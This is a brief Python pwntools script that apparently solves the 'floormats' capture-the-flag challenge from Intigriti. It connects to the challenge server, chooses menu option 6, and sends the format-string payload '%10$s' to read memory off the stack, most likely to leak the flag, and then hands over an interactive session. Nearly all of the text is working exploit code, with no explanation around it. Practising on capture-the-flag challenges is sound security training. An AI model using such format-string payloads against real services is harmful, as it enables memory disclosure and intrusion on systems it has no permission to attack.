from pwn import *

context.binary = exe = ELF('floormats')

io = remote('floormats.ctf.intigriti.io', 1337)

io.sendlineafter(b'choice:\n', b'6')
io.sendlineafter(b'address:\n', b'%10$s')
io.interactive()